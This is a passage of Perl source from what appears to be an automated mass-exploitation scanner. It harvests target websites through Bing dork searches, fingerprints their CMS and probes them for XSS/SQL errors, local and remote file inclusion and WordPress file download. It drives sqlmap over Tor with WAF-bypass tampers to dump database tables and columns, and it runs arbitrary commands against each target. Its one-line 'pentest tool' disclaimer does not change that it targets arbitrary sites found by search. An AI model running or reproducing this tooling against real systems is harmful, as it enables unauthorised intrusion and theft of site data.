  if($URL1 !~ /http:\/\//) { $URL1 = "http://$URL1"; };	
  print color 'bold';
  print "    HTTP:   ";
  print color RESET;
  print "HTTP/1.1 $status\n";

  print color 'bold';
  print "    SERVER: ";
  print color RESET;
  if (defined $serverheader) {
    print "$serverheader \n";
  }else{
	print "Undefined\n";
  } 
  for my $ERROR (@ERROR) {
	if ( $html =~ /$ERROR/ ){
	  $ERROR1=$ERROR;
	  checkerrortype();
	}
  }
  for my $MODULETYPE (@MODULETYPE) {
	if ( $html =~ /$MODULETYPE/ ){
	  $MODULETYPE1=$MODULETYPE;
	  checkcmstype();
	}
  }
  print color 'bold';
  print "    SCAN:   ";
  print color RESET;
  if (($response->is_success and !$response->previous) && ($html =~ m/$yes/i) && ($html !~ m/$no/i)){
	print color 'green';
	if (defined $cms) {
      print "$cms\n";
	}elsif (defined $cmails) {
      print "$1\n";
	}else{
      print "$URL1\n";
	}
    print color RESET;
	open (INFO, '>>scan.txt');
	if (defined $cmails) {
      print INFO "$1\n";
	}else{
      print INFO "$URL1\n";
	}
    close (INFO);
	if (defined $cmails){
      open (LOG, '>>scan2.txt');
      print LOG "$URL1\n   $1\n";
	}
    close (LOG);
  }else{
	print color 'red';
    print "No Results Found! \n";
	print color RESET;
	
  }
}	
############################################################################################################################################################################################
############################################################################################################################################################################################
sub checkerrortype { 
  print color 'bold';
  print "    ERROR:  ";
  print color RESET;
  print color 'yellow';
  for my $ERROR (@ERROR) {
  	if ($ERROR1 eq $ERROR){
      if ($ERROR eq $ERROR[0]){
	    print "Possible Lfi Vulnerability!\n";
      }else{
	    print "$ERROR\n";
	  }
	}  
  }
  print color RESET;
}	  	
############################################################################################################################################################################################
############################################################################################################################################################################################
sub checkcmstype {
  print color 'bold';
  print "    CMS:    ";
  print color RESET;
  print color 'yellow';
  for my $MODULETYPE (@MODULETYPE) {
  	if ($MODULETYPE1 eq $MODULETYPE){
      if ($MODULETYPE eq $MODULETYPE[0]){ print "WordPress\n";
      }elsif ($MODULETYPE eq $MODULETYPE[1]){ print "Joomla\n";
      }elsif ($MODULETYPE eq $MODULETYPE[2]){ print "Textpattern\n";
      }elsif ($MODULETYPE eq $MODULETYPE[3]){ print "SMF\n";
      }elsif ($MODULETYPE eq $MODULETYPE[4]){ print "phpBB\n";
      }elsif (($MODULETYPE eq $MODULETYPE[5]) || ($MODULETYPE eq $MODULETYPE[6])){ print "vBulletin\n";
      }elsif ($MODULETYPE eq $MODULETYPE[7]){ print "MyBB\n";
      }elsif (($MODULETYPE eq $MODULETYPE[8]) || ($MODULETYPE eq $MODULETYPE[9])) { print "CloudFlare\n";
      }elsif ($MODULETYPE eq $MODULETYPE[10]){ print "Drupal\n";
      }elsif ($MODULETYPE eq $MODULETYPE[11]){ print "PostNuke\n";
      }elsif ($MODULETYPE eq $MODULETYPE[12]){ print "ATutor\n";
      }elsif ($MODULETYPE eq $MODULETYPE[13]){ print "PHP-Nuke\n";
      }elsif (($MODULETYPE eq $MODULETYPE[14]) || ($MODULETYPE eq $MODULETYPE[15])){ print "Moodle\n";
      }elsif ($MODULETYPE eq $MODULETYPE[16]){ print "AdaptCMS\n";
      }elsif ($MODULETYPE eq $MODULETYPE[17]){ print "SilverStripe\n";
      }elsif ($MODULETYPE eq $MODULETYPE[18]){ print "MODx\n";
      }elsif ($MODULETYPE eq $MODULETYPE[19]){ print "XOOPS\n";
      }elsif (($MODULETYPE eq $MODULETYPE[20]) || ($MODULETYPE eq $MODULETYPE[21])) { print "OsCommerce\n";
      }elsif (($MODULETYPE eq $MODULETYPE[22]) || ($MODULETYPE eq $MODULETYPE[23])) { print "PrestaShop\n";
      }elsif ($MODULETYPE eq $MODULETYPE[24]){ print "b2evolution\n";
      }elsif (($MODULETYPE eq $MODULETYPE[25]) || ($MODULETYPE eq $MODULETYPE[26])) { print "Magento\n";
      }elsif (($MODULETYPE eq $MODULETYPE[27]) || ($MODULETYPE eq $MODULETYPE[28])) { print "Zen Cart\n";
      }elsif (($MODULETYPE eq $MODULETYPE[29]) || ($MODULETYPE eq $MODULETYPE[30])) { print "Concrete5\n";
      }elsif ($MODULETYPE eq $MODULETYPE[31]){ print "OpenCart\n";}
	}
  }	 
  print color RESET;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub finmodule {
  $list = "scan.txt";
  if (-e $list){  
    print" \n";
    my $lc = 0;
    my $file = "scan.txt";
    my %seen = ();
    {
      local @ARGV = ($file);
      local $^I = '.bac';
      while(<>){
        $seen{$_}++;
        next if $seen{$_} > 1;
        print;
        close (TEXT);
	    unlink "scan.txt.bac";
	  }
    }
    open $file, "<", "scan.txt";
    $lc++ while <$file>;
    print color 'green';
    print "[!] $lc Unique Result(s) Found!\n";
	print color RESET;
    close $file;
    if (defined $output) {
	  use File::Copy qw(copy);
      copy 'scan.txt', getlist();
	}
	$zatr= getlist();
    print color 'green';
    print "[!] Results saved in $Bin/$zatr!\n";
	print color RESET;
    print color RESET;
    print color 'red';
	timer();
    print "SCAN FINISHED!\n";
    print color RESET;
	  
  }else{
    negative();
  }
  unlink 'serach.txt';
  exit();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub fincontinuemodule {
  my $lc = 0;
  open $file, "<", "scan.txt";
  $lc++ while <$file>;
  print color 'green';
  print "[!] $lc Target(s) Found!\n";
  print color RESET;
  close $file;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub negative {	
  print color 'red';
  print "[!] No Results Found!\n";
  print color RESET;
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub subfin {
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub searchexitstargets {
  if (!-e 'search.txt'){
    print color 'bold';
    print "[ ] ----------------------------------------------------------------------- [ ]\n";
    print color 'RESET';
    print color 'yellow';
    print "[!] No Target list found!\n";
    print color 'RESET';
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub desclaimer {
  print color 'bold';
  print "[ ] ---------------------------------------------------------------------------\n";
  print color RESET;
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print "[ ] This is a pentest tool! We will not be responsible or liable, directly  [ ]\n";
  print "[ ]    or indirectly in any way for any loss or damage of any kind          [ ]\n";
  print "[ ]                incurred as result of our program use !!                 [ ]\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  osinfo();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub submsearch {
  testconection();
  $checksearchscanlist = "search.txt";
  if (-e $checksearchscanlist){ unlink 'search.txt'};
  dorklist();
  msearch();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn sub msearch
sub msearch {
  $browserlang = $browserlangs[int rand @browserlangs];
  scandetail();
  print color 'bold yellow';
  print "[+] RANDOM SEARCH:: ";
  print color RESET;
  print color 'cyan';
  print "BING [bing.". $browserlang . "]\n";
  print color RESET;
  
  if (defined $dork) {
    print color 'bold yellow';
    print "[+] SEARCH:: ";
    print color RESET;
    print color 'cyan';
    print "[$dork] ";
    print color RESET;
	my $pattern = '.txt|.log';
	if ($dork =~ m/$pattern/i){
	  countdorks();
	}else{
      print "\n";
	}
  }
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING ENGINE SCAN... \n";
  print color RESET;
  
  forwait();
  $count=0;
  open (FILE, "dorks.txt");
  while (my $dork = <FILE>) {
    chomp $dork;
	$count++;

	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $replace) && (!defined $with) && (!defined $mmails)) {
      print color 'bold magenta';
	  timer();
	  print "[$count/";
	  countdorkslist();
	  print "] ";
	  print "[SCAN:: $dork]\n";
      print color RESET;
	}
	$mlevel = $mlevel;
    $s_results = $dork;
	if ((defined $Target) || (defined $rangip)) {
      $s_results = "ip%3A".$dork;
      $s_results =~ s/ //g;
	}
    my @scanlist=&scan($s_results);
    sub scan(){
      my @search;
      for($npages=0;$npages<=$mlevel;$npages+=10){
       my $google=("http://www.bing.com/search?q=".$s_results."&first=".$npages."&FORM=PERE&cc=".$browserlang);
		my $search=$ua->get("$google");
        $search->as_string;
        my $Res=$search->content;
		$count=0;
        while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)/g){
          if($1 !~ /msn|live|bing|exploit4arab|pastebin|microsoft|WindowsLiveTranslator|youtube|google|cache|74.125.153.132|inurl:|q=|404|403|Time|out|Network|Failed|adw.sapo|tripadvisor|yandex/){
            my $URL=$1;
			$count++;
            $URL=~s/&(.*)/\ /g;
			if ($repeat{$URL}) {
			}else{
			  if (($URL !~ /http:\/\//) && ($URL !~ /https:\/\//)) { $URL = "http://$URL"; };
	          if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $replace) && (!defined $with)) {
	            print color 'bold';
	            timer();
	            print "[$count]\n";
	            print color RESET;
	            print color 'bold';
			    print "    TARGET: ";
	            print color RESET;
	            print color 'blue';
                print "$URL\n";
	            print color RESET;
			    $URL1=$URL;
				checkextrainfo();
				$request = HTTP::Request->new('GET', $URL);
                my $response = $ua->request($request);
                my $html = $response->content;
                my $status = $response->code;
                my $serverheader = $response->server;
	            print color 'bold';
	            print "    HTTP:   ";
	            print color RESET;
	            print "HTTP/1.1 $status\n";
                print color 'bold';
                print "    SERVER: ";
                print color RESET;
                if (defined $serverheader) {
                  print "$serverheader\n";
                }else{
	              print "Undefined\n";
                }
                for my $ERROR (@ERROR) {
	              if ( $html =~ /$ERROR/ ){
	                $ERROR1=$ERROR;
	                checkerrortype();
	              }
                }
                for my $MODULETYPE (@MODULETYPE) {
	              if ( $html =~ /$MODULETYPE/ ){
	                $MODULETYPE1=$MODULETYPE;
	                checkcmstype();
				  }
                }
		        print "[ ]............................................................................ \n";
			  }
              open (TEXT, '>>search.txt');
			  print TEXT "$URL\n";
              close (TEXT);
			  $repeat{$URL}++;
			}
          }
        }
      }
    }   
  }
  $list = "search.txt";
  if (-e $list){
    my $lc = 0;
	my $file = "search.txt";
    my %seen = ();
    {
      local @ARGV = ($file);
      local $^I = '.bac';
      while(<>){
        $seen{$_}++;
        next if $seen{$_} > 1;
        print;
        close (TEXT);
		unlink "search.txt.bac";
      }
    }
    open $file, "<", "search.txt";
    $lc++ while <$file>;
	print color 'green';
	print "[!] $lc Unique Result(s) Found!\n";
	print color RESET;
	close $file;
    print color RESET;
	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $replace) && (!defined $with)) {
      print color 'green';
	  if (defined $output) {
		if (-e $output){ unlink $output};
	    $listme = "search.txt";
        use File::Copy qw(copy);
	    copy $listme, $output;
	    unlink 'search.txt';
        print "[!] Results saved in $Bin/$output\n";
	  }else{
        print "[!] Results saved in $Bin/search.txt\n";
	  }
      print color RESET;
      print color 'red';
      timer();
      print "SCAN FINISHED!\n";
      print color RESET;
	}else{
	  if (-e 'scan.txt'){ unlink 'scan.txt'};
	  if (defined $output){
	    if (-e $output){ unlink $output};
	  }
	}
  }else{
    print color 'yellow';
    print "[+] No Results Found!\n";
    print color RESET;
    print color 'red';
    timer();
    print "SCAN FINISHED!\n";
    print color RESET;
  }
} ## end sub msearch
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn misup
sub misup {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  if (-e 'validated.txt'){ unlink 'validated.txt';}
  testconection();
  if (!defined $mlevel){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING HTTP VALIDATION SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$printarget\n";
	print color RESET;
    $URL = control($URL);
    $URL1 = $URL;
	$URL1 =~ s/ //g;
	$yes='a';
    $no = 'iiiiiix';
	checkedurl();
    print "[ ]............................................................................ \n";
  }
  close(TEXT);
  if (-e "validated".getlist()) {unlink "validated_".getlist();}
  if (-e 'scan.txt') {
    unlink 'search.txt';
    use File::Copy qw(copy);
    copy 'scan.txt', "validated_".getlist();
    use File::Copy qw(copy);
    copy 'scan.txt', 'search.txt';
	fincontinuemodule();
	print color 'green';
    print "[!] Results saved in $Bin/validated_".getlist()."!\n";
	print color RESET;
    subfin();
  }else{
	print color 'red';
    print "[!] No Results Found!\n";
    subfin();
	exit();
  }
  if ((!defined $validation_text) && (!defined $mxss) && (!defined $mlfi) && (!defined $command) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails)) {
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn mvalidation
sub mvalidation {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  if (!defined $mlevel){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING VALIDATION SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  if (defined $mnoshow) {
    print color 'yellow';
    print "[!] Please wait...\n";
    print color RESET;
  }
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
	chomp $URL;
    $count++;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$printarget\n";
	print color RESET;
    $URL = control($URL);
    $URL1 = $URL;
    $yes = $validation_text;
    $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	checkedurl();
    print "[ ]............................................................................ \n";
  }
  close(TEXT);
  if (-e "validated".getlist()) {unlink "validated_".getlist();}
  if (-e 'scan.txt') {
    unlink 'search.txt';
    use File::Copy qw(copy);
    copy 'scan.txt', "validated_".getlist();
    use File::Copy qw(copy);
    copy 'scan.txt', 'search.txt';
	fincontinuemodule();
	print color 'green';
    print "[!] Results saved in $Bin/validated_".getlist()."!\n";
	print color RESET;
    subfin();
  }else{
	print color 'red';
    print "[!] No Results Found!\n";
    subfin();
	exit();
  }
  if ((!defined $misup) && (!defined $mxss) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails)) {
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn mcommand
sub mcommand {
  testconection();
 if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING EXTERNAL COMMAND SUBPROCESS...\n";
  print "[ ]............................................................................ \n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
    print "$URL \n";
	print color RESET;
    $URL1=$URL;
    checkextrainfo();
	
	print color 'bold';
	print "    CMD:    ";
	print color RESET;
	
	if ((!defined $misup) && (!defined $validation_text)) {
      $URL = control($URL);
	}
	
	if ($command =~ /--TARGET/) {
	  if (index($URL, 'http://') != -1) {
	    $URL =~ s/http:\/\///g;
	  }	  
	  $URL =~ s/\/.*//g;
	  $command =~ s/--TARGET/$URL/g;
	  if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
	}elsif ($command =~ /FULL_TARGET/) {
	  $command =~ s/--FULL_TARGET/$URL/g;
    }
	print "$command\n\n";
    system($command); 
    
    print "\n[ ] ----------------------------------------------------------------------- [ ]\n";
  }
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
  
  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $replace) && (!defined $with) && (!defined $mmails)) {
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn mxss
sub mxss {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  XSS();
  if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING XSS SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$printarget\n";
	print color RESET;
	if ((!defined $misup) && (!defined $validation_text)) {
      $URL = control($URL);
	}
	foreach $XSS(@XSS){
      $URL1 = $URL.$XSS;
	  $URL1 =~ s/ //g;
      $yes = 'MySQL|syntax|SQL|mysql_fetch_assoc|num_rows|ORA-01756|PostgreSQL|internal server error';
      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	  checkedurl();
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  if (-e "xss".getlist()) {unlink "xss_".getlist();}
  if (-e 'scan.txt') {
    use File::Copy qw(copy);
    copy 'scan.txt', "xss_".getlist();
	fincontinuemodule();
	print color 'green';
    print "[!] Results saved in $Bin/xss_".getlist()."!\n";
	print color RESET;
    subfin();
  }else{
	print color 'red';
    print "[!] No Results Found!\n";
    subfin();
  }
  if ((!defined $sqlmap) && (!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
##bgn sqlmap 
sub sqlmap {
  testconection();
  if (!defined $mlevel){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING SQLMAP SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (INFO, 'xss_scan.txt');
  while (my $URL = <INFO>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	$URL =~ s/\%.*//s;
	if (defined $proxy) {
	  $tor = "--tor --check-tor --tor-type=SOCKS5";
	}else{
	  $tor = "";
	}
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsqllist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$URL \n";
	print color RESET;
    print color 'bold';
    print "[+] EXPLOITATION: ";
    print color RESET;
	print "Sqlmap \n\n";
    print color 'yellow';
    print "[+] Checking databases...\n";
    print color RESET;
    system("sqlmap -u $URL --beep --level 3 --risk 2 --threads 2 $tor --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
		
	### BEG DATABASE
	DATABASE:; 
    print color 'yellow'; 
    print "[+] Do You Want To Exploit DATABASE? (Y/n): ";
    print color RESET;
    $sqldatabase=<STDIN>;

    chomp ($sqldatabase);
		
	if ($sqldatabase =~ /^[Y]?$/i) {
	  DATABASENAME:;
      print color 'yellow';
      print "[+] Enter DataBase Name: ";
      print color RESET;
      $databasename=<STDIN>;
      chomp ($databasename);
	  if (!$databasename){ 
        print color 'red';
	    print "[+] Uppss.. you have to Enter DataBase Name!\n";
        print color RESET;
	    goto DATABASENAME;
      };
      print color 'yellow';
      print "[+] Checking...";
      print color RESET;
      system("sqlmap -u $URL --beep --level 3 --risk 2 --threads 2 $tor -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");		
	  ### END DATABASE
	  ### BEG TABLES
	  TABLESYES:;
      print color 'yellow'; 
      print "[+] Do You Want To Exploit Tables? (Y/n): ";
      print color RESET;
      $sqltableyes=<STDIN>;
      chomp ($sqltableyes);
		  
	  if ($sqltableyes =~ /^[Y]?$/i) {
		TABLES:;
        print color 'yellow';
        print "[+] Enter Table Name: ";
        print color RESET;
        $sqltables=<STDIN>;
        chomp ($sqltables);
	    if (!$sqltables){ 
          print color 'red';
	      print "[+] Uppss.. you have to Enter Table Name!\n";
          print color RESET;
	      goto TABLES;
        }
        print color 'yellow';
        print "[+] Checking DataBase Tables...";
        print color RESET;
        system("sqlmap -u $URL --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
		### END TABLES
		### BEG COLUMNS
		COLUMNSYES:;
        print color 'yellow'; 
        print "[+] Do You Want To Exploit Columns? (Y/n): ";
        print color RESET;
        $sqlcolyes=<STDIN>;
        chomp ($sqlcolyes);
	    if ($sqlcolyes =~ /^[Y]?$/i) {
		  COLS:;
          print color 'yellow';
          print "[+] Enter Column Name [ex: admin,users,orders]: ";
          print color RESET;
          $sqlcolumn=<STDIN>;
          chomp ($sqlcolumn);
	      if (!$sqlcolumn){ 
            print color 'red';
	        print "[+] Uppss.. you have to Enter Column Name!\n";
            print color RESET;
	        goto COLS;
          }
          print color 'yellow';
          print "[+] Checking Columns...";
          print color RESET;
          system("sqlmap -u $URL --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
	    } ### END COLUMNS
	  }
	}
  }
  close(TEXT);
  print "[ ]............................................................................ \n";
  if ((!defined $mwpadf) && (!defined $mlfi) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
    print color 'red';
	timer();
    print "SCAN FINISHED!\n";
    print color RESET;
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn mlfi
sub mlfi {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  LFI();
  if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING LFI SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	$URL =~ s/=.*/=/s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$printarget\n";
	print color RESET;
	foreach $LFI(@LFI){
	  print color 'bold';
	  print "    EXPL:   ";
	  print color RESET;
      print "$LFI \n";
      $URL1 = $URL.$LFI;
	  $URL1 =~ s/ //g;
      $yes = 'root:x|bin:x|nologin';
      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	  checkedurl();
	  print "    [ ]...................................................................... \n";
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  if (-e "lfi".getlist()) {unlink "lfi_".getlist();}
  if (-e 'scan.txt') {
    use File::Copy qw(copy);
    copy 'scan.txt', "lfi_".getlist();
	fincontinuemodule();
	print color 'green';
    print "[!] Results saved in $Bin/lfi_".getlist()."!\n";
	print color RESET;
    subfin();
  }else{
	print color 'red';
    print "[!] No Results Found!\n";
    subfin();
  }
  if ((!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn mjoomrfi
sub mjoomrfi {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  RFI();
  if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING JOOMLA RFI SCAN...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*//s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$printarget\n";
	print color RESET;
	foreach $RFI(@RFI){
	  print color 'bold';
	  print "    EXPL:   ";
	  print color RESET;
      print "$RFI \n";
      $URL1 = $URL.$RFI;
	  $URL1 =~ s/ //g;
      $yes = 'r57shell|safe_mode|Executed|Shell';
	  checkedurl();
	  print "    [ ]...................................................................... \n";
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  if (-e "rfi".getlist()) {unlink "rfi_".getlist();}
  if (-e 'scan.txt') {
    use File::Copy qw(copy);
    copy 'scan.txt', "rfi_".getlist();
	fincontinuemodule();
	print color 'green';
    print "[!] Results saved in $Bin/rfi_".getlist()."!\n";
	print color RESET;
    subfin();
  }else{
	print color 'red';
    print "[!] No Results Found!\n";
    subfin();
  }
  if ((!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn mwpadf
sub mwpadf {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  ADFWP();
  if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING WORDRESS ADF SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*//s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$printarget\n";
	print color RESET;
	foreach $ADFWP(@ADFWP){
	  print color 'bold';
	  print "    EXPL:   ";
	  print color RESET;
      print "$ADFWP \n";
